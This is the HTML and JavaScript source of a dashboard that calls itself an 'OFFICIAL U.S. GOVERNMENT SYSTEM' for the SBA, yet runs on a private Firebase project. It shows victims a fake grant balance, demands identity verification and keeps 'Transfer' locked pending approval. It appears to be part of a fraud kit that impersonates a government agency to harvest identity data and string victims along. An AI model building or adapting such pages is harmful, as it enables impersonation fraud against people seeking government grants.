<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA Portal | Secure Dashboard</title>
    <style>
        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --bg: #f8fafc; }
        body { background: var(--bg); margin: 0; font-family: 'Segoe UI', Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
        .nav-logo { color: white; margin: 0; font-size: 16px; letter-spacing: 2px; font-weight: 900; }
        
        .signout-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 5px 12px; border-radius: 4px; font-size: 10px; font-weight: 800; cursor: pointer; }

        .balance-section {
            background: linear-gradient(135deg, #00274c 0%, #004a91 100%);
            margin: 15px; padding: 25px; border-radius: 12px; color: white; box-shadow: 0 8px 20px rgba(0,39,76,0.15);
            position: relative; overflow: hidden;
        }

        .balance-section::after {
            content: ""; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
            animation: shield-sweep 3s infinite;
        }
        @keyframes shield-sweep { 100% { left: 200%; } }

        .case-number { font-size: 10px; opacity: 0.7; font-family: monospace; margin-top: 5px; letter-spacing: 1px; }

        .status-pill { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; margin-top: 12px; background: rgba(255,255,255,0.2); transition: 0.3s; }
        .status-verified { background: #10b981 !important; }
        .status-rejected { background: var(--sba-red) !important; color: white !important; }

        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; max-width: 500px; margin: 0 auto; }
        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; position: relative; }
        .grid-item:active { transform: scale(0.95); }
        .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
        .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
        
        .is-locked { opacity: 0.5; cursor: not-allowed !important; }
        .lock-icon { position: absolute; top: 5px; right: 5px; font-size: 10px; color: #94a3b8; }
        .is-done { border: 2px solid #10b981; background: #f0fdf4; }
        .is-error { border: 2px solid var(--sba-red); background: #fff1f2; }

        .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; min-height: 150px; }
        .log-title { font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        .log-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f8fafc; }
        .log-item:last-child { border-bottom: none; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SBA PORTAL
    </div>

    <div class="nav-header">
        <h1 class="nav-logo">SBA.GOV</h1>
        <button class="signout-btn" id="signOutBtn">SIGN OUT</button>
    </div>

    <div class="balance-section">
        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Current Grant Allocation</p>
        <h1 id="userBalance" style="font-size:32px; margin:8px 0; font-weight: 800;">$0.00</h1>
        <div id="caseId" class="case-number">CASE ID: SYNCING...</div>
        <div id="statusPill" class="status-pill">INITIALIZING...</div>
    </div>

    <div class="grid-container">
        <div class="grid-item" onclick="location.href='apply.html'"><span>📝</span><b>Apply</b></div>
        <div class="grid-item" id="transferBtn"><span>🏦</span><b>Transfer</b></div>
        <div class="grid-item" onclick="location.href='transactions.html'"><span>📊</span><b>History</b></div>
        <div class="grid-item" id="kycBtn"><span>🛡️</span><b>Verify</b></div>
        <div class="grid-item" onclick="location.href='support.html'"><span>💬</span><b>Support</b></div>
        <div class="grid-item" onclick="location.href='settings.html'"><span>⚙️</span><b>Profile</b></div>
    </div>

    <div class="activity-card">
        <div class="log-title"><span>RECENT ACTIVITY (TOP 3)</span><span style="color:#10b981;">SECURE</span></div>
        <div id="activityLog">
            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:20px;">Fetching logs...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, query, where } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
            projectId: "sba-portal-2026-f1253",
            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
            messagingSenderId: "363290267220",
            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (!user) { window.location.href = 'index.html'; return; }

            document.getElementById('caseId').innerText = `CASE ID: SBA-${user.uid.substring(0,8).toUpperCase()}-2026`;

            // 1. BALANCE & KYC MONITOR
            onSnapshot(doc(db, "users", user.uid), (snap) => {
                if (snap.exists()) {
                    const data = snap.data();
                    let bal = parseFloat(data.balance) || 0;
                    document.getElementById('userBalance').innerText = "$" + bal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                    
                    const kycStatus = (data.kycStatus || "NOT STARTED").toUpperCase();
                    const pill = document.getElementById('statusPill');
                    const transferBtn = document.getElementById('transferBtn');
                    const kycBtn = document.getElementById('kycBtn');

                    if(kycStatus === "APPROVED") {
                        pill.innerText = "● ACCOUNT VERIFIED"; pill.className = "status-pill status-verified";
                        kycBtn.className = "grid-item is-done"; kycBtn.innerHTML = "<span>✅</span><b>Verified</b>";
                        if(bal > 0) {
                            transferBtn.classList.remove('is-locked');
                            transferBtn.innerHTML = "<span>🏦</span><b>Transfer</b>";
                            transferBtn.onclick = () => location.href = 'transfer.html';
                        } else {
                            transferBtn.classList.add('is-locked');
                            transferBtn.innerHTML = "<span>🏦</span><b>Transfer</b><div class='lock-icon'>🔒</div>";
                            transferBtn.onclick = () => alert("Funds pending approval.");
                        }
                    } else if (["REJECTED", "DECLINED"].includes(kycStatus)) {
                        pill.innerText = "● VERIFICATION REJECTED"; pill.className = "status-pill status-rejected";
                        kycBtn.className = "grid-item is-error";
                    } else {
                        pill.innerText = "● PENDING VERIFICATION";
                        transferBtn.classList.add('is-locked');
                        transferBtn.onclick = () => alert("Identity verification required.");
                    }
                }
            });

            // 2. RECENT TRANSACTIONS (FIXED: MANUAL SORT TO PREVENT FIREBASE ERROR)
            const qry = query(collection(db, "requests"), where("userId", "==", user.uid));

            onSnapshot(qry, (snap) => {
                const logBox = document.getElementById('activityLog');
                if(snap.empty) {
                    logBox.innerHTML = `<p style="text-align:center; font-size:10px; color:#94a3b8; padding:20px;">No transaction history found.</p>`;
                    return;
                }

                // Gather data into an array (Same as transactions.html)
                let items = [];
                snap.forEach(d => items.push({ id: d.id, ...d.data() }));

                // Manual sort by timestamp newest first
                items.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));

                // Limit to top 3 for dashboard
                const top3 = items.slice(0, 3);

                logBox.innerHTML = "";
                top3.forEach(r => {
                    const status = (r.status || 'PENDING').toUpperCase();
                    let color = "#f59e0b"; 
                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) color = "#10b981";
                    if (["FAILED", "REJECTED", "DECLINED"].includes(status)) color = "#ef4444";

                    logBox.innerHTML += `
                        <div class="log-item">
                            <div>
                                <b style="font-size:11px; color:#1e293b;">${(r.type || "FUNDING").toUpperCase()}</b><br>
                                <small style="font-size:8px; color:#94a3b8;">${r.id.substring(0,10).toUpperCase()}</small>
                            </div>
                            <div style="text-align:right;">
                                <b style="font-size:12px; color:#1e293b;">$${parseFloat(r.amount || 0).toLocaleString()}</b><br>
                                <small style="color:${color}; font-size:9px; font-weight:bold;">${status}</small>
                            </div>
                        </div>`;
                });
            });
        });

        document.getElementById('signOutBtn').onclick = () => signOut(auth).then(() => window.location.href = 'index.html');
    </script>
</body>
</html>
